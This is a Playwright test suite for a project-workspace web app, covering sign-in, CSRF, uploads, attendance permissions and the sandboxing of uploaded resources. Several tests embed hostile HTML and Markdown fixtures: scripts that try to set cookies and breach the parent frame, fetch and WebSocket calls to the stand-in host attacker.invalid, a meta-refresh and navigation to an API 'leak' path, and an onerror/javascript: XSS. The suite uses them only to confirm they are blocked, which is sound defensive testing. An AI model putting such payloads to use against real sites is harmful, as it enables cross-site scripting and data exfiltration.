import { test, expect } from "@playwright/test";
import type { Page } from "@playwright/test";
const pid = "10000000-0000-4000-8000-000000000001",
  rid = "20000000-0000-4000-8000-000000000001",
  uid = "30000000-0000-4000-8000-000000000001";
const stamp = "2026-10-31T09:00:00Z";
const project = {
  id: pid,
  title: "Contract project",
  description: "Production API integration fixture",
  creator_id: uid,
  created_at: stamp,
  updated_at: stamp,
};
const member = {
  id: uid,
  display_name: "Test Administrator",
  email: "test@example.com",
  active: true,
  created_at: stamp,
  updated_at: stamp,
};
const session = {
  user: {
    id: uid,
    display_name: "Test Administrator",
    email: "test@example.com",
    role: "member",
    can_manage_attendance: true,
  },
  csrf_token: "test-csrf-token",
};
const list = (items: unknown[]) => ({
  items,
  total: items.length,
  limit: 100,
  offset: 0,
});
async function fixture(
  page: Page,
  options: {
    html?: string;
    type?: "html" | "markdown" | "pdf";
    sessionStatus?: number;
    attendanceCapability?: boolean | null;
    sessionRole?: "member" | "admin";
  } = {},
) {
  const type = options.type || "html";
  let attendanceEvents: Record<string, unknown>[] = [];
  const resolvedSession = {
    ...session,
    user: {
      ...session.user,
      role: options.sessionRole ?? "member",
      can_manage_attendance:
        options.attendanceCapability === null
          ? undefined
          : (options.attendanceCapability ?? true),
    },
  };
  if (resolvedSession.user.can_manage_attendance !== true)
    attendanceEvents = [
      {
        id: rid,
        member_id: uid,
        event_type: "late",
        event_date: "2026-11-01",
        minutes_late: 8,
        creator_id: uid,
        editor_id: uid,
        created_at: stamp,
        updated_at: stamp,
      },
    ];
  const resource = {
    id: rid,
    project_id: pid,
    title: "Security fixture",
    folder_id: null,
    filename: `fixture.${type === "markdown" ? "md" : type}`,
    original_filename: `fixture.${type === "markdown" ? "md" : type}`,
    resource_type: type,
    content_type:
      type === "html"
        ? "text/html"
        : type === "pdf"
          ? "application/pdf"
          : "text/markdown",
    byte_size: 100,
    sha256: "test",
    uploader_id: uid,
    created_at: stamp,
    updated_at: stamp,
  };
  const requests: {
    path: string;
    method: string;
    csrf?: string;
    cookie?: string;
    body?: string | null;
  }[] = [];
  await page.context().addCookies([
    {
      name: "workstation",
      value: "test-session-cookie",
      url: "http://127.0.0.1:4173",
    },
  ]);
  await page.route("**/api/v1/**", async (route) => {
    const req = route.request();
    const path = new URL(req.url()).pathname.replace("/api/v1", "");
    requests.push({
      path,
      method: req.method(),
      csrf: req.headers()["x-csrf-token"],
      cookie: req.headers()["cookie"],
      body: req.postData(),
    });
    const send = (body: unknown, status = 200) =>
      route.fulfill({
        status,
        contentType: "application/json",
        body: JSON.stringify(body),
      });
    if (path === "/auth/session")
      return options.sessionStatus
        ? send(
            {
              error: {
                code:
                  options.sessionStatus === 403
                    ? "access_denied"
                    : "unauthenticated",
                message: "Authentication required",
              },
            },
            options.sessionStatus,
          )
        : send(resolvedSession);
    if (path === "/auth/logout") return route.fulfill({ status: 204 });
    if (path === "/projects" && req.method() === "POST")
      return send({ ...project, ...req.postDataJSON() }, 201);
    if (path === "/projects") return send(list([project]));
    if (path === `/projects/${pid}`) return send(project);
    if (path === "/members")
      return send({
        ...list([member]),
        directory_status: {
          last_success_at: stamp,
          stale: false,
          error_code: null,
          max_age_seconds: 0,
        },
      });
    if (path === "/attendance/summary")
      return send(
        list([
          {
            member_id: uid,
            late_count: attendanceEvents.filter((e) => e.event_type === "late")
              .length,
            absence_count: attendanceEvents.filter(
              (e) => e.event_type === "absent",
            ).length,
          },
        ]),
      );
    if (path.startsWith("/attendance/events")) {
      if (req.method() === "GET") return send(list(attendanceEvents));
      if (resolvedSession.user.can_manage_attendance !== true)
        return send(
          {
            error: {
              code: "forbidden",
              message: "Attendance access is unavailable.",
            },
          },
          403,
        );
      if (req.method() === "POST") {
        const event = {
          id: rid,
          creator_id: uid,
          editor_id: uid,
          created_at: stamp,
          updated_at: stamp,
          ...req.postDataJSON(),
        };
        attendanceEvents.push(event);
        return send(event, 201);
      }
      if (req.method() === "PATCH") {
        attendanceEvents[0] = { ...attendanceEvents[0], ...req.postDataJSON() };
        return send(attendanceEvents[0]);
      }
      attendanceEvents = [];
      return route.fulfill({ status: 204 });
    }
    if (path.endsWith("/folders") || path.endsWith("/links"))
      return send(list([]));
    if (path.endsWith("/documentation"))
      return send({
        id: rid,
        project_id: pid,
        overview_markdown: "# Overview",
        created_at: stamp,
        updated_at: stamp,
      });
    if (path.endsWith("/context-export"))
      return route.fulfill({
        status: 200,
        contentType: "application/zip",
        headers: {
          "Content-Disposition": 'attachment; filename="context.zip"',
        },
        body: Buffer.from(
          "504b0506000000000000000000000000000000000000",
          "hex",
        ),
      });
    if (path.endsWith("/resources") && req.method() === "POST") {
      await new Promise((resolve) => setTimeout(resolve, 500));
      return send(resource, 201);
    }
    if (path.endsWith("/resources")) return send(list([resource]));
    if (path.endsWith("/content") || path.endsWith("/download"))
      return route.fulfill({
        status: 200,
        contentType: resource.content_type,
        body:
          options.html ||
          "<!doctype html><html><body><h1 id=\"slide\">First slide</h1><button onclick=\"document.querySelector('#slide').textContent='Second slide'\">Next</button></body></html>",
      });
    return send(
      { error: { code: "not_found", message: "Test endpoint not found" } },
      404,
    );
  });
  return { requests, resource };
}
test("production has no demo fallback; loading, signed-out, access denied and service failures", async ({
  page,
}) => {
  await fixture(page, { sessionStatus: 401 });
  await page.goto("/");
  await expect(
    page.getByRole("heading", { name: /Work Station/ }),
  ).toBeVisible();
  await expect(page.getByText("DEMO WORKSPACE")).toHaveCount(0);
  await expect(
    page.getByRole("link", { name: "Continue with Microsoft" }),
  ).toHaveAttribute("href", "/api/v1/auth/login");
  await page.route("**/api/v1/auth/session", (route) =>
    route.fulfill({
      status: 403,
      json: { error: { code: "access_denied", message: "Access denied" } },
    }),
  );
  await page.reload();
  await expect(
    page.getByRole("heading", { name: "Access is restricted" }),
  ).toBeVisible();
  await page.route("**/api/v1/auth/session", async (route) => {
    await new Promise((r) => setTimeout(r, 400));
    return route.fulfill({
      status: 503,
      json: {
        error: {
          code: "directory_unavailable",
          message: "Directory unavailable",
        },
      },
    });
  });
  await page.reload();
  await expect(page.getByRole("status")).toContainText("Opening WorkStation");
  await expect(
    page.getByRole("heading", { name: "We couldn’t connect" }),
  ).toBeVisible();
  await expect(page.getByText("Brand & identity")).toHaveCount(0);
});
test("production cookie and CSRF contract, upload progress, context ZIP and session expiry", async ({
  page,
}) => {
  const { requests } = await fixture(page);
  await page.goto("/projects");
  await page.getByRole("button", { name: "New project", exact: true }).click();
  await page.getByLabel("Project title").fill("Created through API");
  await page
    .getByRole("button", { name: "Create project", exact: true })
    .click();
  await expect(
    page.getByRole("heading", { name: "Contract project", exact: true }),
  ).toBeVisible();
  expect(
    requests.find((r) => r.path === "/projects" && r.method === "POST")?.csrf,
  ).toBe("test-csrf-token");
  expect(
    requests.find((r) => r.path === "/projects" && r.method === "GET")?.cookie,
  ).toContain("test-session-cookie");
  await page.getByRole("button", { name: "Upload", exact: true }).click();
  await page.getByLabel("Resource file").setInputFiles({
    name: "notes.md",
    mimeType: "text/markdown",
    buffer: Buffer.from("# New resource"),
  });
  await page
    .getByRole("dialog")
    .getByRole("button", { name: "Upload files", exact: true })
    .click();
  await expect(
    page.getByRole("progressbar", { name: "Upload progress for notes.md" }),
  ).toBeVisible();
  await page.getByRole("button", { name: "Done", exact: true }).click();
  await expect(page.getByRole("dialog")).toHaveCount(0);
  const uploaded = requests.find(
    (r) => r.path.endsWith("/resources") && r.method === "POST",
  );
  expect(uploaded?.csrf).toBe("test-csrf-token");
  expect(uploaded?.cookie).toContain("test-session-cookie");
  expect(uploaded?.body).toContain('filename="notes.md"');
  await page.getByRole("link", { name: "Documentation hub" }).click();
  const downloadPromise = page.waitForEvent("download");
  await page.getByRole("button", { name: "Extract context" }).click();
  const dl = await downloadPromise;
  expect(dl.suggestedFilename()).toBe("Contract project-context.zip");
  await expect(page.getByRole("status")).toContainText("Archive downloaded");
  expect(requests.some((r) => r.path.endsWith("/context-export"))).toBe(true);
  await page.route("**/api/v1/projects/*/context-export", (route) =>
    route.fulfill({
      status: 401,
      json: { error: { code: "session_expired", message: "Session expired" } },
    }),
  );
  await page.route("**/api/v1/auth/session", (route) =>
    route.fulfill({
      status: 401,
      json: { error: { code: "unauthenticated", message: "Sign in" } },
    }),
  );
  await page.getByRole("button", { name: "Extract context" }).click();
  await expect(
    page.getByRole("heading", { name: "Your session has expired" }),
  ).toBeVisible();
  await expect(
    page.getByRole("heading", { name: "Contract project", exact: true }),
  ).toHaveCount(0);
});
test("script opt-in preserves navigation and opaque sandbox isolation", async ({
  page,
}) => {
  const body = `<!doctype html><html><body><h1 id="slide">First slide</h1><button onclick="document.querySelector('#slide').textContent='Second slide'">Next</button><script>window.scriptRan=true;try{parent.document.body.dataset.breached='yes'}catch(e){window.parentBlocked=true}try{document.cookie='stolen=yes';window.cookieAllowed=true}catch(e){window.cookieBlocked=true}try{localStorage.setItem('stolen','yes')}catch(e){window.storageBlocked=true}</script></body></html>`;
  await fixture(page, { html: body });
  await page.goto(`/projects/${pid}/resources/${rid}`);
  const iframe = page.locator("iframe");
  await expect(iframe).toHaveAttribute("sandbox", "");
  const frame = page.frameLocator("iframe");
  await expect(
    frame.getByRole("heading", { name: "First slide" }),
  ).toBeVisible();
  await frame.getByRole("button", { name: "Next", exact: true }).click();
  await expect(
    frame.getByRole("heading", { name: "First slide" }),
  ).toBeVisible();
  await page.getByLabel("Enable slide navigation scripts").check();
  await expect(iframe).toHaveAttribute("sandbox", "allow-scripts");
  await frame.getByRole("button", { name: "Next", exact: true }).click();
  await expect(
    frame.getByRole("heading", { name: "Second slide" }),
  ).toBeVisible();
  const child = page.frames().find((f) => f.url() === "about:srcdoc")!;
  expect(
    await child.evaluate(() => ({
      ran: (window as any).scriptRan,
      parent: (window as any).parentBlocked,
      cookie: (window as any).cookieBlocked,
      storage: (window as any).storageBlocked,
    })),
  ).toEqual({ ran: true, parent: true, cookie: true, storage: true });
  expect(
    await page.evaluate(() => document.body.dataset.breached),
  ).toBeUndefined();
  await page.getByRole("button", { name: "Present fullscreen" }).click();
  await expect
    .poll(() => page.evaluate(() => !!document.fullscreenElement))
    .toBe(true);
  await page.keyboard.press("Escape");
});
test("HTML network, nested frames, forms, parent navigation and API self-navigation are blocked", async ({
  page,
}) => {
  const body = `<!doctype html><html><body><h1>Attack fixture</h1><img src="https://attacker.invalid/image"><iframe src="https://attacker.invalid/frame"></iframe><form action="https://attacker.invalid/form" method="post"><button>Submit</button></form><script>fetch('https://attacker.invalid/fetch').catch(()=>{});fetch('/api/v1/leak').catch(()=>{});try{new WebSocket('wss://attacker.invalid/socket')}catch(e){};try{new Worker('https://attacker.invalid/worker')}catch(e){};try{top.location='https://attacker.invalid/top'}catch(e){};window.open('https://attacker.invalid/popup');</script><button onclick="location.href='https://attacker.invalid/self'">External self</button><button onclick="location.href='/api/v1/leak'">API self</button></body></html>`;
  const reached: string[] = [];
  await page.route("https://attacker.invalid/**", (r) => {
    reached.push(r.request().url());
    return r.abort();
  });
  const { requests } = await fixture(page, { html: body });
  await page.goto(`/projects/${pid}/resources/${rid}`);
  await page.getByLabel("Enable slide navigation scripts").check();
  const frame = page.frameLocator("iframe");
  await expect(
    frame.getByRole("heading", { name: "Attack fixture" }),
  ).toBeVisible();
  await frame.getByRole("button", { name: "Submit", exact: true }).click();
  await frame.getByRole("button", { name: "External self" }).click();
  await page.waitForTimeout(150);
  expect(reached).toEqual([]);
  expect(requests.some((r) => r.path === "/leak")).toBe(false);
  expect(page.url()).toContain(`/projects/${pid}/resources/${rid}`);
  // Reload a fresh sandbox after the blocked navigation to test another target.
  await page.reload();
  await page.getByLabel("Enable slide navigation scripts").check();
  await frame.getByRole("button", { name: "API self" }).click();
  await page.waitForTimeout(150);
  expect(requests.some((r) => r.path === "/leak")).toBe(false);
  expect(page.context().pages()).toHaveLength(1);
});
test("meta refresh cannot navigate an uploaded deck to an API endpoint", async ({
  page,
}) => {
  const { requests } = await fixture(page, {
    html: '<!doctype html><html><head><meta http-equiv="refresh" content="0; url=/api/v1/leak"></head><body>Refresh attack</body></html>',
  });
  await page.goto(`/projects/${pid}/resources/${rid}`);
  await page.getByLabel("Enable slide navigation scripts").check();
  await page.waitForTimeout(200);
  expect(requests.some((r) => r.path === "/leak")).toBe(false);
  expect(page.url()).toContain(`/projects/${pid}/resources/${rid}`);
});
test("Markdown raw HTML, dangerous links and tracking images do not execute", async ({
  page,
}) => {
  await fixture(page, {
    type: "markdown",
    html: '# Safe Markdown\n\n| A | B |\n| --- | --- |\n| One | Two |\n\n```js\nconst x = 1\n```\n\n<img src="x" onerror="alert(1)">\n\n[bad](javascript:alert(1))\n\n![tracker](https://attacker.invalid/track)\n\n[reference](https://example.com)',
  });
  await page.goto(`/projects/${pid}/resources/${rid}`);
  await expect(
    page.getByRole("heading", { name: "Safe Markdown" }),
  ).toBeVisible();
  await expect(page.locator(".markdown table")).toBeVisible();
  await expect(page.locator(".markdown pre")).toContainText("const x = 1");
  await expect(page.locator(".markdown img")).toHaveCount(0);
  await expect(page.locator('.markdown a[href^="javascript:"]')).toHaveCount(0);
  await expect(
    page.getByRole("link", { name: "reference", exact: true }),
  ).toHaveAttribute("rel", "noopener noreferrer");
});
test("PDF uses credentialed content, a local blob reader and a download fallback", async ({
  page,
}) => {
  const pdf =
    "%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 300 300]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF";
  const { requests } = await fixture(page, { type: "pdf", html: pdf });
  await page.goto(`/projects/${pid}/resources/${rid}`);
  await expect(page.getByTitle("Security fixture PDF preview")).toHaveAttribute(
    "src",
    /^blob:/,
  );
  expect(requests.find((r) => r.path.endsWith("/content"))?.cookie).toContain(
    "test-session-cookie",
  );
  const dl = page.waitForEvent("download");
  await page.getByRole("button", { name: "Download original" }).click();
  expect((await dl).suggestedFilename()).toBe("fixture.pdf");
});

test("browser sign-in hints are static, consumed, focused and never override a valid session", async ({
  page,
}) => {
  await fixture(page, { sessionStatus: 401 });
  const cases = [
    ["login_denied", "cancelled or access was denied"],
    ["invalid_login", "expired or could not be verified"],
    ["not_whitelisted", "does not have access"],
    ["directory_unavailable", "temporarily unavailable"],
    ["development_identity_required", "not configured"],
    ["<script>untrusted-value</script>", "could not complete sign-in"],
  ];
  for (const [code, message] of cases) {
    await page.goto(`/?auth_error=${encodeURIComponent(code)}`);
    await expect(page.getByRole("alert")).toContainText(message);
    await expect(
      page.getByRole("heading", { name: "Work Station" }),
    ).toBeFocused();
    expect(new URL(page.url()).searchParams.has("auth_error")).toBe(false);
    await expect(page.getByText("untrusted-value")).toHaveCount(0);
    await expect(
      page.getByRole("link", { name: "Continue with Microsoft" }),
    ).toHaveAttribute("href", "/api/v1/auth/login");
    await expect(
      page.getByRole("link", { name: "Development administrator" }),
    ).toHaveCount(0);
  }
  await page.route("**/api/v1/auth/session", (route) =>
    route.fulfill({ json: session }),
  );
  await page.goto("/?auth_error=not_whitelisted");
  await expect(
    page.getByRole("heading", { name: "Your projects" }),
  ).toBeVisible();
  await expect(page.getByRole("alert")).toHaveCount(0);
});

test("logout errors preserve authentication and already-signed-out 401 clears it", async ({
  page,
}) => {
  await fixture(page);
  await page.goto("/projects");
  for (const status of [403, 503]) {
    await page.route("**/api/v1/auth/logout", (route) =>
      route.fulfill({
        status,
        json: {
          error: {
            code: status === 403 ? "csrf_failed" : "database_unavailable",
            message: "Logout could not be completed",
          },
        },
      }),
    );
    await page.locator(".user-trigger").click();
    await page.getByRole("menuitem", { name: "Sign out" }).click();
    await expect(page.getByRole("alert")).toContainText(
      "Logout could not be completed",
    );
    await expect(
      page.getByRole("heading", { name: "Your projects" }),
    ).toBeVisible();
  }
  await page.route("**/api/v1/auth/logout", async (route) => {
    await page.route("**/api/v1/auth/session", (r) =>
      r.fulfill({
        status: 401,
        json: { error: { code: "unauthenticated", message: "Signed out" } },
      }),
    );
    return route.fulfill({
      status: 401,
      json: { error: { code: "unauthenticated", message: "Signed out" } },
    });
  });
  await page.locator(".user-trigger").click();
  await page.getByRole("menuitem", { name: "Sign out" }).click();
  await expect(
    page.getByRole("heading", { name: "Work Station" }),
  ).toBeVisible();
});

test("Markdown conflicts preserve drafts and compare the exact content version before saving", async ({
  page,
}) => {
  await fixture(page, { type: "markdown", html: "# First version" });
  let text = "# First version";
  const writes: Record<string, string>[] = [];
  await page.route(
    `**/api/v1/projects/${pid}/resources/${rid}/content`,
    async (route) => {
      if (route.request().method() === "PUT") {
        const data = route.request().postDataJSON();
        writes.push(data);
        if (writes.length === 1) {
          text = "# Teammate revision";
          return route.fulfill({
            status: 409,
            json: {
              error: {
                code: "content_conflict",
                message: "The file changed since you opened it.",
              },
            },
          });
        }
        text = data.content_markdown;
        return route.fulfill({ json: { id: rid } });
      }
      return route.fulfill({ contentType: "text/markdown", body: text });
    },
  );
  await page.goto(`/projects/${pid}/resources/${rid}`);
  await page
    .getByRole("button", { name: "Edit Markdown", exact: true })
    .click();
  await expect(page.getByLabel("File Markdown")).toHaveValue("# First version");
  await page.getByLabel("File Markdown").fill("# My unsaved draft");
  await page
    .getByRole("button", { name: "Save Markdown", exact: true })
    .click();
  await expect(page.getByLabel("File Markdown")).toHaveValue(
    "# My unsaved draft",
  );
  await expect(page.getByRole("dialog").getByRole("alert")).toContainText(
    "changed",
  );
  const { createHash } = await import("node:crypto");
  expect(writes[0].expected_sha256).toBe(
    createHash("sha256").update("# First version").digest("hex"),
  );
  await page
    .getByRole("button", { name: "Load latest for comparison" })
    .click();
  await expect(page.getByLabel("Latest saved Markdown")).toHaveValue(
    "# Teammate revision",
  );
  await expect(page.getByLabel("File Markdown")).toHaveValue(
    "# My unsaved draft",
  );
  await page.getByLabel("File Markdown").fill("# Reconciled version");
  await page
    .getByRole("button", { name: "Save Markdown", exact: true })
    .click();
  expect(writes[1].expected_sha256).toBe(
    createHash("sha256").update("# Teammate revision").digest("hex"),
  );
  await expect(page.getByRole("dialog")).toHaveCount(0);
  await expect(
    page.getByRole("heading", { name: "Reconciled version" }),
  ).toBeVisible();
});

test("explorer includes folders and files beyond the first metadata page", async ({
  page,
}) => {
  const { resource } = await fixture(page, { type: "markdown" });
  const folders = Array.from({ length: 101 }, (_, i) => ({
    id: `40000000-0000-4000-8000-${String(i).padStart(12, "0")}`,
    project_id: pid,
    parent_id: null,
    name: `Folder ${String(i).padStart(3, "0")}`,
    created_at: stamp,
    updated_at: stamp,
  }));
  const files = Array.from({ length: 101 }, (_, i) => ({
    ...resource,
    id: `50000000-0000-4000-8000-${String(i).padStart(12, "0")}`,
    filename: `file-${i}.md`,
    title: `File ${i}`,
    folder_id: folders[i].id,
  }));
  const seen: string[] = [];
  for (const [path, items] of [
    ["folders", folders],
    ["resources", files],
  ] as const) {
    await page.route(`**/api/v1/projects/${pid}/${path}?*`, async (route) => {
      const url = new URL(route.request().url()),
        offset = Number(url.searchParams.get("offset")),
        limit = Number(url.searchParams.get("limit"));
      seen.push(`${path}:${offset}`);
      await route.fulfill({
        json: {
          items: items.slice(offset, offset + limit),
          total: items.length,
          offset,
          limit,
        },
      });
    });
  }
  await page.goto(`/projects/${pid}/documentation`);
  await page
    .getByRole("button", { name: "Folder 100 Folder · 1 items", exact: true })
    .click();
  await expect(
    page.getByRole("link", { name: /^File 100 file-100.md/ }),
  ).toBeVisible();
  expect(seen).toEqual(
    expect.arrayContaining(["folders:100", "resources:100"]),
  );
});

for (const [label, role, capability] of [
  ["member granted", "member", true],
  ["legacy admin denied", "admin", false],
  ["legacy admin missing capability", "admin", null],
] as const) {
  test(`attendance uses explicit session capability: ${label}`, async ({
    page,
  }) => {
    const f = await fixture(page, {
      sessionRole: role,
      attendanceCapability: capability,
    });
    await page.goto("/croissantage");
    await expect(
      page.getByText(
        "Active WorkStation members who have completed their first authorized sign-in.",
      ),
    ).toBeVisible();
    await expect(
      page.getByText(
        /View-only access|Administrator access|Directory synchronized|haven’t signed in/,
      ),
    ).toHaveCount(0);
    const record = page.getByRole("button", {
      name: "Record attendance",
      exact: true,
    });
    if (!capability) {
      await expect(record).toHaveCount(0);
      await page
        .getByRole("button", { name: "View history for Test Administrator" })
        .click();
      await expect(record).toHaveCount(0);
      await expect(page.locator(".event-row")).toContainText("Late arrival");
      await expect(
        page.getByRole("button", { name: /^(Edit|Delete) event on/ }),
      ).toHaveCount(0);
      expect(
        f.requests.filter(
          (r) => r.path.startsWith("/attendance") && r.method !== "GET",
        ),
      ).toHaveLength(0);
      return;
    }
    await record.click();
    await page.getByLabel("Team member", { exact: true }).selectOption(uid);
    await page.getByLabel("Event date").fill("2026-11-01");
    await page.getByLabel("Minutes late").fill("8");
    await page
      .getByRole("button", { name: "Record event", exact: true })
      .click();
    await expect(page.getByRole("dialog")).toHaveCount(0);
    await page
      .getByRole("button", { name: "View history for Test Administrator" })
      .click();
    await expect(page.locator(".event-row")).toContainText(
      "Late arrival · 8 min",
    );
    await page
      .getByRole("button", { name: "Edit event on 2026-11-01" })
      .click();
    await page.getByLabel("Event type").selectOption("absent");
    await page
      .getByRole("button", { name: "Save changes", exact: true })
      .click();
    await expect(page.locator(".event-row")).toContainText("Absence");
    await page
      .getByRole("button", { name: "Delete event on 2026-11-01" })
      .click();
    await page
      .getByRole("button", { name: "Delete event", exact: true })
      .click();
    await expect(page.getByText("A clear record")).toBeVisible();
    const mutations = f.requests.filter(
      (r) => r.path.startsWith("/attendance") && r.method !== "GET",
    );
    expect(mutations.map((r) => r.method)).toEqual(["POST", "PATCH", "DELETE"]);
    for (const request of mutations) {
      expect(request.csrf).toBe("test-csrf-token");
      expect(request.cookie).toContain("test-session-cookie");
    }
  });
}
